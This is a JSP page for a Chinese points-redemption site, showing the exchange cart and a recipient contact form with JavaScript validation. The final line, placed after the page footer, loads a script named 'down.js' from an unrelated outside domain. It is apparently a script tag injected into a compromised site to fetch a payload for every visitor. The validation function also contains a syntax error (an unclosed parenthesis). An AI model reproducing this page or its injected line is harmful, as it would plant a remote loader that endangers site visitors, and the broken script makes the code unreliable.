<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-兑换"/> 
<%@ include file="IncludeTop.jsp" %>
<script type="text/javascript">
function checkAll(){
	if(
	   validate(document.createExchangeForm.name, '姓名', 'chinese', 0, 64, false) &&
       validate(document.createExchangeForm.address, '地址', 'public', 0, 255, false)&&	   
	   validate(document.createExchangeForm.zip, '邮编', 'number', 6, 6, false)&&
	   validate(document.createExchangeForm.telNo, '联系电话', 'public', 0, 20, true)&&
	   validate(document.createExchangeForm.mobile, '手机', 'number', 0, 20, true)&&
   	   validate(document.createExchangeForm.email, 'Email', 'email', 0, 64, false)){
	         if(isBothNull(document.createExchangeForm.telNo.value, document.createExchangeForm.mobile.value){
			    alert('联系电话和手机不能同时为空');
			    return false;
			}
	   	    return true;
	   }
   return false;
}
</script>
<style type="text/css">
<!--
.STYLE1 {color: #FF0000}
-->
</style>


<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" height="129" valign="top">
		<%@ include file="accountBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>	</td>
    <td bgcolor="#FFFFFF" valign="top" width="602"> 
	  <form name="createExchangeForm" method="post" action='<c:url value="/createExchange.do"/>' submit="">
        <table width="100%" border="0" cellpadding="1" cellspacing="0" bordercolor="#CCCCCC">
          <tr bgcolor="#ACD1FF"> 
            <td height="28" colspan="2" align="center"><strong>您的兑换清单</strong></td>
            <td align="center"><a href='<c:url value="/queryProduct.do"/>'>继续兑换</a></td>
          </tr>
          <tr bgcolor="#E1EFFF"> 
            <td width="35%" height="28" align="center"> 
            商品名称</td>
            <td width="15%" align="center"> 
            积点数</td>
            <td width="15%" align="center"> 
            数量</td>
          </tr>
          <c:set var="cart" value="${sessionScope.cart}"/>
		  <c:if test="${cart eq null or cart.items eq null or cart.itemSize eq 0}"> 
          <tr> 
            <td height="79" colspan="3" align="center" class="red15"> 
              暂为空！</td>
          </tr>
          </c:if>
		  <c:if test="${cart ne null}">
		  <c:forEach var="item" items="${cart.items}" > 
          <tr> 
            <td width="35%" height="29" align="center"><c:out value="${item.product.name}"/></td>
            <td width="15%" align="center"><c:out value="${item.realPoint}"/></td>
            <td width="15%" align="center"><c:out value="${item.quantity}"/></td>
          </tr>
          </c:forEach>
		  </c:if> 
          <tr bgcolor="#E1EFFF"> 
            <td width="35%" height="35" align="center"><strong>合计</strong></td>
            <td width="15%" align="center"><c:out value="${cart.total}"/></td>
            <td width="15%" align="center"><c:out value="${cart.count}"/></td>
          </tr>
        </table>
		<c:set var="customer" value="${sessionScope.userSession.customer}"/>
		<table width="100%" border="0">
          <tr>
            <td height="28" colspan="2">&nbsp;</td>
          </tr>
          <tr bgcolor="#ACD1FF"> 
            <td height="28" colspan="2" align="center"> 
            <p><strong> 收货人联系方式：</strong></p>            </td>
          </tr>
          <tr> 
            <td width="16%" height="28" align="right"><span class="STYLE1">*</span>姓名：</td>
            <td width="73%"> 
              <input type="text" name="name" value='<c:out value="${customer.name}"/>' maxlength="64" size="20" >            </td>
          </tr>
          <tr> 
            <td width="16%" height="28" align="right"> <span class="STYLE1">*</span>地址：</td>
            <td width="73%"> 
              <input type="text" name="address" value='<c:out value="${customer.address}"/>'  maxlength="255" size="60">            </td>
          </tr>
          <tr> 
            <td width="16%" align="right" height="28"><span class="STYLE1">*</span>邮编：</td>
            <td width="73%"> 
              <input type="text" name="zip"  value='<c:out value="${customer.zip}"/>'  size="20" maxlength="6">            </td>
          </tr>
          <tr> 
            <td width="16%" align="right" height="28"><span class="STYLE1">*</span>联系电话：</td>
            <td width="73%"> 
              <input type="text" name="telNo" value='<c:out value="${customer.telNo}"/>' size="20" maxlength="20">            </td>
          </tr>
          <tr> 
            <td width="16%" align="right" height="28"><span class="STYLE1">*</span>手机：</td>
            <td width="73%"> 
              <input type="text" name="mobile" value='<c:out value="${customer.mobile}"/>' size="20" maxlength="20">            </td>
          </tr>
          <tr> 
            <td width="16%" align="right" height="28"><span class="STYLE1">*</span>Email：</td>
            <td width="73%"> 
              <input type="text" name="email" value='<c:out value="${customer.email}"/>'  size="40" maxlength="64">            </td>
          </tr>
          
          <tr> 
            <td width="16%">&nbsp;</td>
            <td width="73%">&nbsp;</td>
          </tr>
          <tr  bgcolor="#E1EFFF"> 
            <td colspan="2" align="center" height="31"> 
              <input type="submit" name="Submit" value="提交">              <input type="reset" name="Submit2" value="重置">              </td>
          </tr>
        </table>
  </form>    </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>